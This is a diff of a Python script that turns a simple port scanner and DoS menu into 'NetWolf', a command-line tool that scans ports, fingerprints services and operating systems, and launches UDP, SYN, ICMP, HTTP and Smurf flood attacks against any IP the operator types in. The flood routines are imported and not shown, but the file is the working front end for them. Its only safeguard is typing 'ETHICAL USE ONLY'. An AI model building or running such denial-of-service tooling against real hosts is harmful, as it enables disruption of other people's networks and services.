@@ -1,123 +1,189 @@
 import socket
-import threading 
+import threading
 import time
+import json
+import os
+from datetime import datetime
+from utils.attack import udp_flood, tcp_flood, icmp_flood, http_flood, smurf_attack
+from utils.scanner import port_scan, service_detection, os_fingerprint
 
+class NetWolf:
+    def __init__(self):
+        self.scan_results = []
 
-from utils.attack import send_packet 
-
-
-
-def scan_port(target, port):
-   
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1) 
-        
-        result = s.connect_ex((target, port))
-        
-        if result == 0:
-            print(f"Port {port} is open")
-        
-        s.close() 
-        
-    except Exception as e:
-       
-        pass
-
-def start_scan(target_ip, ports_to_scan_list):
-    """
-    Initiates a multi-threaded port scan on the given target IP for a list of ports.
-    """
-    print(f"Starting port scan on {target_ip} for ports {min(ports_to_scan_list)}-{max(ports_to_scan_list)}...")
-    threads = []
-
-    for port in ports_to_scan_list:
-        thread = threading.Thread(target=scan_port, args=(target_ip, port))
-        threads.append(thread)
-        thread.start()
+        self.attack_log = []
+        self.running = True
     
-
-    for thread in threads:
-        thread.join()
-    print(f"Port scan on {target_ip} completed.")
-
-
-def start_attack(target_ip, target_port, packet_count_total):
-   
-    print(f"Starting attack on {target_ip}:{target_port} with {packet_count_total} packets.")
+    def clear_screen(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
     
-
-    packets_sent_counter = 0
-    counter_lock = threading.Lock() 
-
-    def attack_thread_finite():
-        nonlocal packets_sent_counter 
-        while True:
-
-            with counter_lock:
-                if packets_sent_counter >= packet_count_total:
-                    start_attack(target_ip, target_port, packet_count_total) 
-                packets_sent_counter += 1
-            
-            try:
-
-                send_packet(target_ip, target_port)
-            except Exception as e:
-
-                print(f"Thread error during packet {packets_sent_counter}: {e}")
-            
-
-            time.sleep(0.00001) # Very small delay, adjust as needed
-
-    threads = []
-    max_threads = 4  
-    for _ in range(max_threads):
-        thread = threading.Thread(target=attack_thread_finite)
-        thread.start()
-        threads.append(thread)
-
-
-    for thread in threads:
-        thread.join()
-
-    print(f"Attack finished. Total packets sent: {packets_sent_counter}")
-
-
-def main_menu():
-    """
-    Presents the main menu for network scanning and DoS operations.
-    """
-    while True:
-        print("\n--- Network Utilities Menu ---")
-        print("1. Run Port Scan")
-        print("2. Perform DOS")
-        print("3. Exit")
-        
-        choice = input("Please select an option (1, 2 or 3): ") 
-        
-        if choice == '1':
-            print("\n--- Port Scanner ---")
-            target_ip_scan = input("Enter target IP for scan: ")
-            ports_to_scan_list = range(1, 1025) 
-            start_scan(target_ip_scan, ports_to_scan_list)
-
-        elif choice == '2':
-            print("\n--- DOS Attacker ---")
-
-            host_ip = socket.gethostbyname(socket.gethostname()) 
-            target_ip_dos = input("Enter target IP for DoS: ")
-            target_port_dos = int(input("Enter target port for DoS: "))
-            packet_count_dos = int(input("Enter total number of packets to send: "))
+    def print_banner(self):
+        banner = """
+        ╔═══════════════════════════════════════════╗
+        ║     NETWOLF - Network Security Suite      ║
+        ║    Ethical Testing & Analysis Tool        ║
+        ╚═══════════════════════════════════════════╝
+        """
+        print(banner)
     
-            start_attack(target_ip_dos, target_port_dos, packet_count_dos)
+    def save_results(self, data, filename):
+
+        with open(f"{filename}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
+
+            json.dump(data, f, indent=2)
+        print(f"[+] Results saved to {filename}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
+    
+    def run_cli(self):
+        while self.running:
+            self.print_banner()
+            print("\n[ MAIN MENU ]")
+            print("1. Port Scanner")
+
+            print("2. Service Detection")
+            print("3. OS Fingerprinting")
+            print("4. DOS Attack Suite")
+
+            print("5. View Attack Log")
+            print("6. Switch to Web GUI")
+            print("7. Exit")
             
-        elif choice == '3':
-            print("Exiting the program. Goodbye!")
-            break
+            choice = input("\nSelect option (1-7): ")
+            
+            if choice == '1':
+                self.port_scanner_menu()
+            elif choice == '2':
+                self.service_detection_menu()
+            elif choice == '3':
+                self.os_fingerprint_menu()
+            elif choice == '4':
+                self.attack_menu()
+
+            elif choice == '5':
+                self.show_logs()
+            elif choice == '6':
+                self.start_gui()
+            elif choice == '7':
+                self.running = False
+                print("[+] Shutting down NetWolf...")
+            else:
+                print("[-] Invalid option")
+    
+    def port_scanner_menu(self):
+
+        target = input("Target IP: ")
+        start_port = int(input("Start port (1-65535): "))
+
+        end_port = int(input("End port: "))
         
+        print(f"\n[*] Scanning {target} ports {start_port}-{end_port}")
+
+        results = port_scan(target, start_port, end_port)
+        
+        self.scan_results = results
+        print("\n[ OPEN PORTS ]")
+        for r in results:
+            if r['status'] == 'open':
+                print(f"  Port {r['port']}: OPEN")
+        
+        save = input("\nSave results? (y/n): ")
+        if save.lower() == 'y':
+            self.save_results(results, f"scan_{target}")
+    
+    def service_detection_menu(self):
+        target = input("Target IP: ")
+        ports = input("Ports to check (comma separated): ")
+        port_list = [int(p.strip()) for p in ports.split(',')]
+        
+        results = service_detection(target, port_list)
+        print("\n[ SERVICE DETECTION ]")
+        for r in results:
+            print(f"  Port {r['port']}: {r['service']} (banner: {r.get('banner', 'N/A')[:50]})")
+        
+        save = input("\nSave results? (y/n): ")
+        if save.lower() == 'y':
+            self.save_results(results, f"services_{target}")
+    
+    def os_fingerprint_menu(self):
+        target = input("Target IP: ")
+        results = os_fingerprint(target)
+        print(f"\n[ OS Fingerprint Results ]")
+        print(f"  Target: {target}")
+        print(f"  Detected OS: {results['os']}")
+        print(f"  TTL: {results['ttl']}")
+        print(f"  Window Size: {results['window']}")
+    
+    def attack_menu(self):
+        print("\n[ DOS ATTACK SUITE ]")
+        print("1. UDP Flood")
+        print("2. TCP Flood (SYN)")
+        print("3. ICMP Flood (Ping)")
+        print("4. HTTP Flood")
+        print("5. Smurf Attack")
+        
+        attack_type = input("\nSelect attack type (1-5): ")
+        target_ip = input("Target IP: ")
+        target_port = input("Target port (if needed): ")
+        target_port = int(target_port) if target_port else None
+        duration = int(input("Attack duration (seconds): "))
+        threads = int(input("Number of threads (1-20): "))
+        
+        print(f"\n[!] WARNING: Starting {attack_type} attack on {target_ip}")
+        print(f"[!] Duration: {duration} seconds | Threads: {threads}")
+        confirm = input("[!] Type 'ETHICAL USE ONLY' to confirm: ")
+        
+        if confirm == "ETHICAL USE ONLY":
+            self.attack_log.append({
+                'timestamp': datetime.now().isoformat(),
+                'target': target_ip,
+                'type': attack_type,
+                'duration': duration,
+                'threads': threads
+            })
+            
+            if attack_type == '1':
+                udp_flood(target_ip, target_port, duration, threads)
+            elif attack_type == '2':
+                tcp_flood(target_ip, target_port, duration, threads)
+            elif attack_type == '3':
+                icmp_flood(target_ip, duration, threads)
+            elif attack_type == '4':
+                http_flood(target_ip, duration, threads)
+            elif attack_type == '5':
+                smurf_attack(target_ip, duration, threads)
         else:
-            print("Invalid choice. Please type 1, 2 or 3.")
-
+            print("[-] Attack cancelled - confirmation failed")
+    
+    def show_logs(self):
+        if not self.attack_log:
+            print("[*] No attacks logged yet")
+        else:
+            print("\n[ ATTACK HISTORY ]")
+            for log in self.attack_log:
+                print(f"  {log['timestamp']} | {log['type']} | {log['target']} | {log['duration']}s")
+    
+    def start_gui(self):
+        print("[*] Starting web interface on http://127.0.0.1:5000")
+        print("[*] Press Ctrl+C in terminal to return to CLI")
+        try:
+            from web_interface import app
+            app.run(debug=False, host='127.0.0.1', port=5000)
+        except Exception as e:
+            print(f"[-] Failed to start GUI: {e}")
+            print("[*] Make sure Flask is installed: pip install flask")
 
 if __name__ == "__main__":
-    main_menu()
+    print("[*] NetWolf v1.0 - Ethical Network Testing Tool")
+
+    print("[*] Choose interface:")
+    print("    1. Command Line Interface (CLI)")
+    print("    2. Web Graphical Interface (GUI)")
+
+    
+    choice = input("\nSelect (1 or 2): ")
+    tool = NetWolf()
+    
+    if choice == '2':
+        tool.start_gui()
+    else:
+        
+        tool.run_cli()
